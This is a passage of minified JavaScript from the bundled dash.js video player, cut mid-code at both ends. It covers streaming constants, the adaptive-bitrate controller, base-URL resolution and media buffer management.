p,l;Object.defineProperty(M,"__esModule",{value:!0}),u=new(p=m,(l=[{key:"init",value:function(){this.STREAM="stream",this.VIDEO="video",this.AUDIO="audio",this.TEXT="text",this.FRAGMENTED_TEXT="fragmentedText",this.EMBEDDED_TEXT="embeddedText",this.MUXED="muxed",this.IMAGE="image",this.STPP="stpp",this.TTML="ttml",this.VTT="vtt",this.WVTT="wvtt",this.ABR_STRATEGY_DYNAMIC="abrDynamic",this.ABR_STRATEGY_BOLA="abrBola",this.ABR_STRATEGY_THROUGHPUT="abrThroughput",this.MOVING_AVERAGE_SLIDING_WINDOW="slidingWindow",this.MOVING_AVERAGE_EWMA="ewma",this.BAD_ARGUMENT_ERROR="Invalid Arguments",this.MISSING_CONFIG_ERROR="Missing config parameter(s)",this.LOCATION="Location",this.INITIALIZE="initialize",this.TEXT_SHOWING="showing",this.TEXT_HIDDEN="hidden",this.CC1="CC1",this.CC3="CC3",this.UTF8="utf-8",this.SCHEME_ID_URI="schemeIdUri",this.START_TIME="starttime",this.SERVICE_DESCRIPTION_LL_SCHEME="urn:dvb:dash:lowlatency:scope:2019",this.SUPPLEMENTAL_PROPERTY_LL_SCHEME="urn:dvb:dash:lowlatency:critical:2019",this.XML="XML",this.ARRAY_BUFFER="ArrayBuffer"}}])&&v(p.prototype,l),m),M.default=u,da.exports=M.default},{}],109:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.init()}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),u=new(p=m,(l=[{key:"init",value:function(){this.TCP_CONNECTION="TcpList",this.HTTP_REQUEST="HttpList",this.TRACK_SWITCH="RepSwitchList",this.BUFFER_LEVEL="BufferLevel",this.BUFFER_LOADED="bufferLoaded",this.ABANDON_LOAD="abandonload",this.ALLOW_LOAD="allowload",this.BUFFER_EMPTY="bufferStalled",this.BUFFER_STATE="BufferState",this.DVR_INFO="DVRInfo",this.DROPPED_FRAMES="DroppedFrames",this.SCHEDULING_INFO="SchedulingInfo",this.REQUESTS_QUEUE="RequestsQueue",this.MANIFEST_UPDATE="ManifestUpdate",this.MANIFEST_UPDATE_STREAM_INFO="ManifestUpdatePeriodInfo",this.MANIFEST_UPDATE_TRACK_INFO="ManifestUpdateRepresentationInfo",this.PLAY_LIST="PlayList",this.DVB_ERRORS="DVBErrors"}}])&&v(p.prototype,l),m),M.default=u,da.exports=M.default},{}],110:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.init()}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),u=new(p=m,(l=[{key:"init",value:function(){this.CLEARKEY_KEYSTEM_STRING="org.w3.clearkey",this.WIDEVINE_KEYSTEM_STRING="com.widevine.alpha",this.PLAYREADY_KEYSTEM_STRING="com.microsoft.playready"}}])&&v(p.prototype,l),m),M.default=u,da.exports=M.default},{}],111:[function(u,da,M){function v(h){return h&&h.__esModule?h:{default:h}}function m(){function h(){(S=(0,p.default)(Z).create({dashMetrics:hb,mediaPlayerModel:za,settings:bb})).initialize()}function F(){oa={},ba={},ka={},ha={},Ga={},Ya={},void 0===C&&(C=!1),La=Ra=Ba=void 0,clearTimeout(la),la=null}function P(Da){Da.mediaType===l.default.VIDEO&&(Ba=Da.oldQuality,Ra.push(Ba,xa.getPlaybackQuality()))}function O(Da){if(Da.metric!==f.default.HTTP_REQUEST||!Da.value||Da.value.type!==N.HTTPRequest.MEDIA_SEGMENT_TYPE||Da.mediaType!==l.default.AUDIO&&Da.mediaType!==l.default.VIDEO||La.push(Da.mediaType,Da.value,bb.get().streaming.abr.useDeadTimeLatency),Da.metric===f.default.BUFFER_LEVEL&&(Da.mediaType===l.default.AUDIO||Da.mediaType===l.default.VIDEO)){var Pa=Da.mediaType;Da=.001*Da.value.level;var eb=bb.get().streaming.abr.ABRStrategy;if(eb===l.default.ABR_STRATEGY_BOLA)Ya[Pa]=!0;else if(eb===l.default.ABR_STRATEGY_THROUGHPUT)Ya[Pa]=!1;else{var Ta=za.getStableBufferTime();Ta=((eb=Ya[Pa])?.5*Ta:Ta)<Da,(Ya[Pa]=Ta)!==eb&&(Ta?ia.info("["+Pa+"] switching from throughput to buffer occupancy ABR rule (buffer: "+Da.toFixed(3)+")."):ia.info("["+Pa+"] switching from buffer occupancy to throughput ABR rule (buffer: "+Da.toFixed(3)+")."))}}}function R(Da,Pa){return oa[Pa]=oa[Pa]||{},oa[Pa].hasOwnProperty(Da)||(oa[Pa][Da]=0),function(eb,Ta){if(Ta!==l.default.VIDEO||!bb.get().streaming.abr.limitBitrateByPortal||!ha[Ta])return eb;if(C||A(),Ta=va.getAdaptationForType(0,Ta).Representation,0<fa&&0<qa){for(;0<eb&&Ta[eb]&&fa<Ta[eb].width&&fa-Ta[eb-1].width<Ta[eb].width-fa;)--eb;for(;eb<Ta.length-1&&Ta[eb].width===Ta[eb+1].width;)eb+=1}return eb}((eb=function(eb,Ta){var qb=eb;if(!ha[Ta])return qb;var ib=ja(Ta);return void 0!==ib&&(qb=Math.max(eb,ib)),void 0!==(eb=Q(Ta))&&(qb=Math.min(qb,eb)),qb}(oa[Pa][Da],Da),Ta=Da,qb=oa[Pa][Da],Ta=bb.get().streaming.abr.maxRepresentationRatio[Ta],isNaN(Ta)||1<=Ta||0>Ta?eb:Math.min(eb,Math.round(qb*Ta))),Da);var eb,Ta,qb}function Q(Da){var Pa=bb.get().streaming.abr.maxBitrate[Da];return-1<Pa?ma(ha[Da].getMediaInfo(),Pa):void 0}function ja(Da){var Pa=bb.get().streaming.abr.minBitrate[Da];if(-1<Pa){var eb=ha[Da].getMediaInfo();return(Da=H(eb))[eb=ma(eb,Pa)]&&eb<Da.length-1&&Da[eb].bitrate<1e3*Pa&&eb++,eb}}function W(Da,Pa,eb,Ta){var qb=Pa.id;Pa=B(Da),(0,w.checkInteger)(eb),qb=R(Da,qb),eb!==Pa&&0<=eb&&eb<=qb&&aa(Da,Pa,eb,qb,Ta)}function aa(Da,Pa,eb,Ta,qb){var ib,mb,Db,Ab;Da&&ha[Da]&&(mb=(ib=ha[Da].getStreamInfo())?ib.id:null,bb.get().debug.logLevel===G.default.LOG_LEVEL_DEBUG&&(Db=hb.getCurrentBufferLevel(Da),ia.info("["+Da+"] switch from "+Pa+" to "+eb+"/"+Ta+" (buffer: "+Db+") "+(qb?JSON.stringify(qb):"."))),ba[mb]=ba[mb]||{},ba[mb][Da]=eb,T.trigger(x.default.QUALITY_CHANGE_REQUESTED,{mediaType:Da,streamInfo:ib,oldQuality:Pa,newQuality:eb,reason:qb}),Ab=La.getAverageThroughput(Da),isNaN(Ab)||Ca.setSavedBitrateSettings(Da,Ab))}function ma(Da,Pa,eb){var Ta=Da&&Da.type?ha[Da.type].getRepresentationInfo():null;if(bb.get().streaming.abr.useDeadTimeLatency&&eb&&Ta&&Ta.fragmentDuration){if(eb/=1e3,(Ta=Ta.fragmentDuration)<eb)return 0;Pa*=1-eb/Ta}for(eb=(Da=H(Da)).length-1;0<=eb;eb--)if(1e3*Pa>=Da[eb].bitrate)return eb;return 0}function H(Da){var Pa=[];if(!Da||!Da.bitrateList)return Pa;var eb=Da.bitrateList;Da=Da.type;for(var Ta,qb=0,ib=eb.length;qb<ib;qb++)(Ta=new g.default).mediaType=Da,Ta.qualityIndex=qb,Ta.bitrate=eb[qb].bandwidth,Ta.width=eb[qb].width,Ta.height=eb[qb].height,Ta.scanType=eb[qb].scanType,Pa.push(Ta);return Pa}function B(Da){if(Da&&ha[Da]){var Pa=ha[Da].getStreamInfo();if(Pa=Pa?Pa.id:null)return ba[Pa]=ba[Pa]||{},ba[Pa].hasOwnProperty(Da)||(ba[Pa][Da]=0),ba[Pa][Da]}return 0}function A(){var Da;xa&&(Da=bb.get().streaming.abr.usePixelRatioInLimitBitrateByPortal&&wa.hasOwnProperty("devicePixelRatio")?wa.devicePixelRatio:1,fa=xa.getClientWidth()*Da,qa=xa.getClientHeight()*Da)}function Y(Da){var Pa=Da.request.mediaType;if(bb.get().streaming.abr.autoSwitchBitrate[Pa]){var eb=ha[Pa];if(eb){var Ta,qb=(0,J.default)(Z).create({abrController:pa,streamProcessor:eb,currentRequest:Da.request,useBufferOccupancyABR:Ya[Pa]});(qb=S.shouldAbandonFragment(qb)).quality>E.default.NO_CHANGE&&(Ta=eb.getFragmentModel()).getRequests({state:t.default.FRAGMENT_MODEL_LOADING,index:Da.request.index})[0]&&(Ta.abortRequests(),ka[Pa].state=f.default.ABANDON_LOAD,Ga[Pa].reset(),Ga[Pa].push({oldValue:B(Pa),newValue:qb.quality,confidence:1,reason:qb.reason}),W(Pa,V.getActiveStreamInfo(),qb.quality,qb.reason),clearTimeout(la),la=setTimeout((function(){ka[Pa].state=f.default.ALLOW_LOAD,la=null}),bb.get().streaming.abandonLoadTimeout))}}}var Z=this.context,na=(0,G.default)(Z).getInstance(),T=(0,r.default)(Z).getInstance(),pa=void 0,ia=void 0,S=void 0,V=void 0,oa=void 0,ba=void 0,ha=void 0,ka=void 0,la=void 0,C=void 0,fa=void 0,qa=void 0,va=void 0,xa=void 0,za=void 0,Ca=void 0,Ba=void 0,Ga=void 0,Ra=void 0,La=void 0,Ya=void 0,hb=void 0,bb=void 0;return pa={isPlayingAtTopQuality:function(Da){Da=Da?Da.id:null;var Pa=B(l.default.AUDIO),eb=B(l.default.VIDEO);return Pa===R(l.default.AUDIO,Da)&&eb===R(l.default.VIDEO,Da)},updateTopQualityIndex:function(Da){if(Da){var Pa=Da.streamInfo.id,eb=Da.representationCount-1;return Ta=Da.type,ib=eb,oa[qb=Pa]=oa[qb]||{},oa[qb][Ta]=ib,eb}var Ta,qb,ib},getThroughputHistory:function(){return La},getBitrateList:H,getQualityForBitrate:ma,getTopBitrateInfoFor:function(Da){if(Da&&ha&&ha[Da]){var Pa=ha[Da].getStreamInfo();if(Pa&&Pa.id)return Pa=R(Da,Pa.id),(Da=H(ha[Da].getMediaInfo()))[Pa]?Da[Pa]:null}return null},getMaxAllowedIndexFor:Q,getMinAllowedIndexFor:ja,getInitialBitrateFor:function(Da){if(!Ca||!Ca.hasOwnProperty("getSavedBitrateSettings"))throw Error(l.default.MISSING_CONFIG_ERROR);if(Da===l.default.TEXT||Da===l.default.FRAGMENTED_TEXT)return NaN;var Pa,eb=Ca.getSavedBitrateSettings(Da),Ta=bb.get().streaming.abr.initialBitrate[Da],qb=bb.get().streaming.abr.initialRepresentationRatio[Da];return-1===Ta&&(Ta=-1<qb?(Pa=va.getAdaptationForType(0,Da).Representation,Array.isArray(Pa)?Pa[Math.max(Math.round(Pa.length*qb)-1,0)].bandwidth:0):isNaN(eb)?Da===l.default.VIDEO?1e3:100:eb),Ta},getQualityFor:B,getAbandonmentStateFor:function(Da){return ka[Da]?ka[Da].state:null},setPlaybackQuality:W,checkPlaybackQuality:function(Da){var Pa,eb,Ta,qb,ib,mb,Db,Ab,db,Za;Da&&ha&&ha[Da]&&(eb=(Pa=ha[Da].getStreamInfo())?Pa.id:null,Ta=B(Da),qb=(0,J.default)(Z).create({abrController:pa,streamProcessor:ha[Da],currentValue:Ta,switchHistory:Ga[Da],droppedFramesHistory:Ra,useBufferOccupancyABR:Ya[Da]}),!Ra||(ib=xa.getPlaybackQuality())&&Ra.push(Ba,ib),bb.get().streaming.abr.autoSwitchBitrate[Da]&&(mb=ja(Da),Db=R(Da,eb),db=(Ab=S.getMaxQuality(qb)).quality,void 0!==mb&&(db>E.default.NO_CHANGE?db:Ta)<mb&&(db=mb),Db<db&&(db=Db),Ga[Da].push({oldValue:Ta,newValue:db}),db>E.default.NO_CHANGE&&db!=Ta?(ka[Da].state===f.default.ALLOW_LOAD||Ta<db)&&aa(Da,Ta,db,Db,Ab.reason):bb.get().debug.logLevel===G.default.LOG_LEVEL_DEBUG&&(Za=hb.getCurrentBufferLevel(Da),ia.debug("["+Da+"] stay on "+Ta+"/"+Db+" (buffer: "+Za+")"))))},getTopQualityIndexFor:R,setElementSize:A,setWindowResizeEventCalled:function(Da){C=Da},createAbrRulesCollection:h,registerStreamType:function(Da,Pa){Ga[Da]=Ga[Da]||(0,D.default)(Z).create(),ha[Da]=Pa,ka[Da]=ka[Da]||{},ka[Da].state=f.default.ALLOW_LOAD,Ya[Da]=!1,T.on(x.default.LOADING_PROGRESS,Y,this),Da==l.default.VIDEO&&(T.on(x.default.QUALITY_CHANGE_RENDERED,P,this),Ra=Ra||(0,I.default)(Z).create(),A()),T.on(x.default.METRIC_ADDED,O,this),T.on(x.default.PERIOD_SWITCH_COMPLETED,h,this),La=La||(0,L.default)(Z).create({settings:bb})},unRegisterStreamType:function(Da){delete ha[Da]},setConfig:function(Da){Da&&(Da.streamController&&(V=Da.streamController),Da.domStorage&&(Ca=Da.domStorage),Da.mediaPlayerModel&&(za=Da.mediaPlayerModel),Da.dashMetrics&&(hb=Da.dashMetrics),Da.adapter&&(va=Da.adapter),Da.videoModel&&(xa=Da.videoModel),Da.settings&&(bb=Da.settings))},reset:function(){F(),T.off(x.default.LOADING_PROGRESS,Y,this),T.off(x.default.QUALITY_CHANGE_RENDERED,P,this),T.off(x.default.METRIC_ADDED,O,this),T.off(x.default.PERIOD_SWITCH_COMPLETED,h,this),S&&S.reset()}},ia=na.getLogger(pa),F(),pa}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(189)),l=v(u(108)),f=v(u(109)),g=v(u(224)),t=v(u(149)),r=v(u(46)),x=v(u(54)),z=v(u(47)),J=v(u(185)),E=v(u(186)),D=v(u(187)),I=v(u(184)),L=v(u(188)),G=v(u(45)),N=u(241),w=u(218);m.__dashjs_factory_name="AbrController",(u=z.default.getSingletonFactory(m)).QUALITY_DEFAULT=0,z.default.updateSingletonFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{108:108,109:109,149:149,184:184,185:185,186:186,187:187,188:188,189:189,218:218,224:224,241:241,45:45,46:46,47:47,54:54}],112:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(){var z,J=void 0,E=this.context,D=(0,r.default)(E).getInstance(),I=(0,f.default)(E).getInstance(),L=void 0,G=void 0;return z={reset:function(){L.reset(),G.reset()},initialize:function(N){L.setConfig({adapter:J}),L.update(N),G.chooseSelector(J.getIsDVB(N))},resolve:function(N){if(N=L.getForPath(N).reduce((function(w,h){return(h=G.select(h))?(I.isRelative(h.url)?w.url=I.resolve(h.url,w.url):(w.url=h.url,w.serviceLocation=h.serviceLocation),w.availabilityTimeOffset=h.availabilityTimeOffset,w.availabilityTimeComplete=h.availabilityTimeComplete,w):new g.default}),new g.default),!I.isRelative(N.url))return N},setConfig:function(N){N.baseURLTreeModel&&(L=N.baseURLTreeModel),N.baseURLSelector&&(G=N.baseURLSelector),N.adapter&&(J=N.adapter)}},L=(0,p.default)(E).create(),G=(0,l.default)(E).create(),D.on(x.default.SERVICE_LOCATION_BLACKLIST_CHANGED,(function(N){L.invalidateSelectedIndexes(N.entry)}),z),z}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(147)),l=v(u(205)),f=v(u(220)),g=v(u(85)),t=v(u(47)),r=v(u(46)),x=v(u(54));m.__dashjs_factory_name="BaseURLController",M.default=t.default.getClassFactory(m),da.exports=M.default},{147:147,205:205,220:220,46:46,47:47,54:54,85:85}],113:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){function g(E){-1===r.indexOf(E)&&(r.push(E),x.trigger(z,{entry:E}))}function t(E){g(E.entry)}f=f||{};var r=[],x=(0,l.default)(this.context).getInstance(),z=f.updateEventName,J=f.addBlacklistEventName;return function(){J&&x.on(J,t,this)}(),{add:g,contains:function(E){return!!(r.length&&E&&E.length)&&-1!==r.indexOf(E)},reset:function(){r=[]}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(46));m.__dashjs_factory_name="BlackListController",M.default=p.default.getClassFactory(m),da.exports=M.default},{46:46,47:47}],114:[function(u,da,M){function v(w){return w&&w.__esModule?w:{default:w}}function m(w){function h(Xa,ob){if(!Ib||!Xa)return null;var lb=Xa[0];if($a)try{"function"==typeof(Fa=ob&&ob[Ta]?(0,g.default)(Ca).create($a,lb,Q.bind(this),qb.get().streaming.useAppendWindowEnd,ob[Ta]):(0,g.default)(Ca).create($a,lb,Q.bind(this),qb.get().streaming.useAppendWindowEnd)).getBuffer().initialize&&Fa.getBuffer().initialize(Ta,eb,Xa,Ra)}catch(Kb){mb.fatal("Caught error on create SourceBuffer: "+Kb),Ga.error(new L.default(G.default.MEDIASOURCE_TYPE_UNSUPPORTED_CODE,G.default.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE+Ta))}else Fa=(0,t.default)(Ca).create(Q.bind(this));return ba(this.getRepresentationInfo(Db)),Fa}function F(Xa){Xa.chunk.streamId===eb.id&&Xa.chunk.mediaInfo.type===Ta&&(mb.info("Init fragment finished loading saving to",Ta+"'s init cache"),Ib.save(Xa.chunk),mb.debug("Append Init fragment",Ta," with representationId:",Xa.chunk.representationId," and quality:",Xa.chunk.quality,", data size:",Xa.chunk.bytes.byteLength),O(Xa.chunk))}function P(Xa){var ob;(Xa=Xa.chunk).streamId===eb.id&&Xa.mediaInfo.type==Ta&&(oc?(pc=Xa,(ob=Fa&&Fa.getAllBufferRanges())&&0<ob.length&&.5<Pa.getTimeToStreamEnd()&&(mb.debug("Clearing buffer because track changed - "+(ob.end(ob.length-1)+.5)),S([{start:0,end:ob.end(ob.length-1)+.5,force:!0}]))):O(Xa))}function O(Xa){Fa.append(Xa),Xa.mediaInfo.type===p.default.VIDEO&&xa(J.default.VIDEO_CHUNK_RECEIVED,{chunk:Xa})}function R(Xa){if(Xa&&0<Xa.length)for(var ob=0,lb=Xa.length;ob<lb;ob++)mb.debug("Buffered range: "+Xa.start(ob)+" - "+Xa.end(ob)+", currentTime = ",Pa.getTime())}function Q(Xa){var ob,lb,Kb;if(Xa.error)return 22===Xa.error.code&&(Bb=!0,Za=.8*va(),mb.warn("Quota exceeded, Critical Buffer: "+Za),0<Za&&(ob=Math.max(.2*Za,1),lb=Za-ob,Kb={streaming:{bufferToKeep:parseFloat(ob.toFixed(5)),bufferAheadToKeep:parseFloat(lb.toFixed(5))}},qb.update(Kb))),void(22!==Xa.error.code&&va()<Za||(mb.warn("Clearing playback buffer to overcome quota exceed situation"),xa(J.default.QUOTA_EXCEEDED,{criticalBufferLevel:Za}),ma()));if(Bb=!1,(Sa=Xa.chunk)&&!isNaN(Sa.index)&&(ua=Math.max(Sa.index,ua),na()),Xa=Fa.getAllBufferRanges(),Sa.segmentType===N.HTTPRequest.MEDIA_SEGMENT_TYPE){if(R(Xa),H(),(Ta===p.default.AUDIO||Ta===p.default.VIDEO)&&!isNaN(Qb)){var Sb=Pa.getTime();ob=Y(Qb,0),Sb===Qb&&ob||(lb=La.getCurrentRepresentation().segmentDuration,(ob=Y(Qb,lb))&&(Math.abs(Sb-Qb)>lb?Qb<=ob.end&&(Pa.seek(Math.max(Qb,ob.start),!1,!0),Qb=NaN):Sb<ob.start&&(Pa.seek(ob.start,!1,!0),Qb=NaN)))}}else oc&&(Sb=Pa.getTime(),mb.debug("AppendToBuffer seek target should be "+Sb),xa(J.default.SEEK_TARGET,{time:Sb}));Sa&&xa(Sa.endFragment?J.default.BYTES_APPENDED_END_FRAGMENT:J.default.BYTES_APPENDED,{quality:Sa.quality,startTime:Sa.start,index:Sa.index,bufferedRanges:Xa,mediaType:Ta})}function ja(Xa){Xa.streamInfo.id==eb.id&&Xa.mediaType===Ta&&Db!==Xa.newQuality&&(ba(this.getRepresentationInfo(Xa.newQuality)),Db=Xa.newQuality)}function W(Xa){Qb=Xa.seekTime,Ab&&(Ab=!(Vb=!0),Ka=Number.POSITIVE_INFINITY),(Ta!==p.default.FRAGMENTED_TEXT?ma:H)()}function aa(){Qb=NaN}function ma(){Fa.waitForUpdateEnd((function(){var Xa=[],ob=Fa.getAllBufferRanges();if(ob&&0!==ob.length){var Sb,ac,hc,xc,lb=Pa.getTime(),Kb=ob.end(ob.length-1)+.5;(lb=Ra.getRequests({state:f.default.FRAGMENT_MODEL_EXECUTED,time:lb,threshold:.01})[0])?(Sb={start:0,end:lb.startTime-.5},(ac=Ra.getRequests({state:f.default.FRAGMENT_MODEL_EXECUTED,time:lb.startTime-lb.duration/2,threshold:.01})[0])&&ac.startTime!=lb.startTime&&(Sb.end=ac.startTime),Sb.start<Sb.end&&Sb.end>ob.start(0)&&Xa.push(Sb),hc={start:lb.startTime+lb.duration+.5,end:Kb},(xc=Ra.getRequests({state:f.default.FRAGMENT_MODEL_EXECUTED,time:lb.startTime+lb.duration+.5,threshold:.01})[0])&&xc.startTime!==lb.startTime&&(hc.start=xc.startTime+xc.duration+.5),hc.start<hc.end&&hc.start<Kb&&Xa.push(hc)):(mb.debug("getAllRangesWithSafetyFactor - No request found in current time position, removing full buffer 0 -",Kb),Xa.push({start:0,end:Kb}))}Xa&&0!==Xa.length||H(),S(Xa)}))}function H(){(!oc||Ta===p.default.FRAGMENTED_TEXT&&bb.isTextEnabled())&&Z()}function B(){T()}function A(){Qb=NaN,T()}function Y(Xa,ob){var Kb,hc,lb=Fa.getAllBufferRanges(),Sb=null,ac=null,xc=isNaN(ob)?.15:ob;if(null!=lb){var kc=0;for(hc=lb.length;kc<hc;kc++)if(ob=lb.start(kc),Kb=lb.end(kc),null===Sb){var cc=Math.abs(ob-Xa);(ob<=Xa&&Xa<Kb||cc<=xc)&&(Sb=ob,ac=Kb)}else{if(!(ob-ac<=xc))break;ac=Kb}if(null!==Sb)return{start:Sb,end:ac}}return null}function Z(){var Xa,ob;Pa&&(Xa=(isNaN(Qb)?Pa.getTime():Qb)||0,db=null===(ob=Y(Xa,void 0))?0:ob.end-Xa,xa(J.default.BUFFER_LEVEL_UPDATED,{bufferLevel:db}),T())}function na(){Ka-1<=ua&&!Ab&&void 0===Fa.discharge&&(Ab=!0,mb.debug("checkIfBufferingCompleted trigger BUFFERING_COMPLETED"),xa(J.default.BUFFERING_COMPLETED))}function T(){Ta!==p.default.AUDIO&&Ta!==p.default.VIDEO||(Vb&&!Ab&&0<db&&Pa&&.5>Pa.getTimeToStreamEnd()-db&&(Ab=!(Vb=!1),mb.debug("checkIfSufficientBuffer trigger BUFFERING_COMPLETED"),xa(J.default.BUFFERING_COMPLETED)),(!qb.get().streaming.lowLatencyEnabled&&.5>db||0===db)&&!Ab?pa(l.default.BUFFER_EMPTY):(Ab||db>=eb.manifestInfo.minBufferTime)&&pa(l.default.BUFFER_LOADED))}function pa(Xa){Eb===Xa||Xa===l.default.BUFFER_EMPTY&&0===Pa.getTime()||Ta===p.default.FRAGMENTED_TEXT&&!bb.isTextEnabled()||(Eb=Xa,xa(J.default.BUFFER_LEVEL_STATE_CHANGED,{state:Xa}),xa(Xa===l.default.BUFFER_LOADED?J.default.BUFFER_LOADED:J.default.BUFFER_EMPTY),mb.debug(Xa===l.default.BUFFER_LOADED?"Got enough buffer to start":"Waiting for more buffer before starting playback"))}function S(Xa){Xa&&Fa&&0!==Xa.length&&(Zb.push.apply(Zb,Xa),nb||V())}function V(){if(0===Zb.length||!Fa)return mb.debug("Nothing to prune, halt pruning"),void(nb=!(Zb=[]));var Xa=Fa.getBuffer();if(!Xa||!Xa.buffered||0===Xa.buffered.length)return mb.debug("SourceBuffer is empty (or does not exist), halt pruning"),void(nb=!(Zb=[]));Xa=Zb.shift(),mb.debug("Removing buffer from:",Xa.start,"to",Xa.end),nb=!0,Pa.getTime()<Xa.end&&(Ab=!1,ua=0),Fa.remove(Xa.start,Xa.end,Xa.force)}function oa(Xa){Fa===Xa.buffer&&(mb.debug("onRemoved buffer from:",Xa.from,"to",Xa.to),R(Fa.getAllBufferRanges()),0===Zb.length&&(nb=!1),Xa.unintended&&(mb.warn("Detected unintended removal from:",Xa.from,"to",Xa.to,"setting index handler time to",Xa.from),xa(J.default.SEEK_TARGET,{time:Xa.from})),nb?V():(oc?(oc=!1,pc&&O(pc)):Z(),xa(J.default.BUFFER_CLEARED,{from:Xa.from,to:Xa.to,unintended:Xa.unintended,hasEnoughSpaceToAppend:va()<Za,quotaExceeded:Bb})))}function ba(Xa){Xa&&void 0!==Xa.MSETimeOffset&&Fa&&Fa.updateTimestampOffset&&Fa.updateTimestampOffset(Xa.MSETimeOffset)}function ha(Xa){Xa.sender.getStreamId()===eb.id&&Xa.sender.getType()===Ta&&(Xa.error||ba(Xa.currentRepresentation))}function ka(Xa){Xa.request.mediaInfo.streamInfo.id===eb.id&&Xa.request.mediaType===Ta&&(Ka=Xa.request.index,na())}function la(Xa){var ob;Xa.newMediaInfo.streamInfo.id!==eb.id||Xa.newMediaInfo.type!==Ta||(ob=Fa&&Fa.getAllBufferRanges())&&(mb.info("Track change asked"),Ya.getSwitchMode(Ta)===x.default.TRACK_SWITCH_MODE_ALWAYS_REPLACE&&ob&&0<ob.length&&.5<Pa.getTimeToStreamEnd()&&(Ab=!1,Ka=Number.POSITIVE_INFINITY))}function C(){++rb*(qb.get().streaming.wallclockTimeUpdateInterval/1e3)>=qb.get().streaming.bufferPruningInterval&&(rb=0,function ia(){Fa&&Ta!==p.default.FRAGMENTED_TEXT&&(Ab||S(function(){var Xa=[],ob=Fa.getAllBufferRanges();if(!ob||0===ob.length)return Xa;var hc,lb=Pa.getTime(),Kb=Math.max(0,lb-qb.get().streaming.bufferToKeep),Sb=lb+qb.get().streaming.bufferAheadToKeep,ac=Ra.getRequests({state:f.default.FRAGMENT_MODEL_EXECUTED,time:lb,threshold:.01})[0];if(ac)Kb=Math.min(ac.startTime,Kb),Sb=Math.max(ac.startTime+ac.duration,Sb);else if(0===lb&&Pa.getIsDynamic())return[];if(ob.start(0)<=Kb){for(lb={start:0,end:Kb},ac=0;ac<ob.length&&ob.end(ac)<=Kb;ac++)lb.end=ob.end(ac);lb.start<lb.end&&Xa.push(lb)}return ob.end(ob.length-1)>=Sb&&(hc={start:Sb,end:ob.end(ob.length-1)+.01}).start<hc.end&&Xa.push(hc),Xa}()))}())}function fa(){T()}function qa(Xa,ob){$a=Xa,Fa&&ob&&"function"==typeof Fa.discharge&&(tb=Fa,h(ob))}function va(){var Xa,ob=Fa.getAllBufferRanges(),lb=0;if(!ob)return lb;var Kb=0;for(Xa=ob.length;Kb<Xa;Kb++)lb+=ob.end(Kb)-ob.start(Kb);return lb}function xa(Xa,ob){(ob=ob||{}).sender=ib,ob.mediaType=Ta,ob.streamId=eb.id,Ba.trigger(Xa,ob)}function za(Xa,ob){Za=Number.POSITIVE_INFINITY,Eb=void 0,Db=r.default.QUALITY_DEFAULT,Ka=Number.POSITIVE_INFINITY,Sa=null,Vb=Bb=nb=Ab=!1,rb=db=ua=0,Zb=[],Qb=NaN,Fa&&(Xa||Fa.abort(),Fa.reset(ob),Fa=null),oc=!1}w=w||{};var Ca=this.context,Ba=(0,z.default)(Ca).getInstance(),Ga=w.errHandler,Ra=w.fragmentModel,La=w.representationController,Ya=w.mediaController,hb=w.adapter,bb=w.textController,Da=w.abrController,Pa=w.playbackController,eb=w.streamInfo,Ta=w.type,qb=w.settings,ib=void 0,mb=void 0,Db=void 0,Ab=void 0,db=void 0,Za=void 0,$a=void 0,ua=void 0,Ka=void 0,Fa=void 0,tb=void 0,Eb=void 0,Sa=void 0,rb=void 0,nb=void 0,Bb=void 0,Ib=void 0,Qb=void 0,Vb=void 0,Zb=void 0,oc=void 0,pc=void 0;return ib={getBufferControllerType:function(){return"BufferController"},getRepresentationInfo:function(Xa){return hb.convertDataToRepresentationInfo(La.getRepresentationForQuality(Xa))},initialize:function(Xa){qa(Xa),Db=Da.getQualityFor(Ta),Ba.on(J.default.DATA_UPDATE_COMPLETED,ha,this),Ba.on(J.default.INIT_FRAGMENT_LOADED,F,this),Ba.on(J.default.MEDIA_FRAGMENT_LOADED,P,this),Ba.on(J.default.QUALITY_CHANGE_REQUESTED,ja,this),Ba.on(J.default.STREAM_COMPLETED,ka,this),Ba.on(J.default.PLAYBACK_PLAYING,A,this),Ba.on(J.default.PLAYBACK_PROGRESS,H,this),Ba.on(J.default.PLAYBACK_TIME_UPDATED,H,this),Ba.on(J.default.PLAYBACK_RATE_CHANGED,fa,this),Ba.on(J.default.PLAYBACK_SEEKING,W,this),Ba.on(J.default.PLAYBACK_SEEKED,aa,this),Ba.on(J.default.PLAYBACK_STALLED,B,this),Ba.on(J.default.WALLCLOCK_TIME_UPDATED,C,this),Ba.on(J.default.CURRENT_TRACK_CHANGED,la,this,z.default.EVENT_PRIORITY_HIGH),Ba.on(J.default.SOURCEBUFFER_REMOVE_COMPLETED,oa,this)},createBuffer:h,dischargePreBuffer:function(){if(Fa&&tb&&"function"==typeof tb.discharge){var Xa=tb.getAllBufferRanges();if(0<Xa.length){for(var ob="Beginning "+Ta+"PreBuffer discharge, adding buffer for:",lb=0;lb<Xa.length;lb++)ob+=" start: "+Xa.start(lb)+", end: "+Xa.end(lb)+";";mb.debug(ob)}else mb.debug("PreBuffer discharge requested, but there were no media segments in the PreBuffer.");for(Xa=tb.discharge(),ob=null,lb=0;lb<Xa.length;lb++){var Kb=Xa[lb],Sb=Ib.extract(Kb.streamId,Kb.representationId);Sb&&(ob!==Sb&&(Fa.append(Sb),ob=Sb),Fa.append(Kb))}tb.reset(),tb=null}},getType:function(){return Ta},getBuffer:function(){return 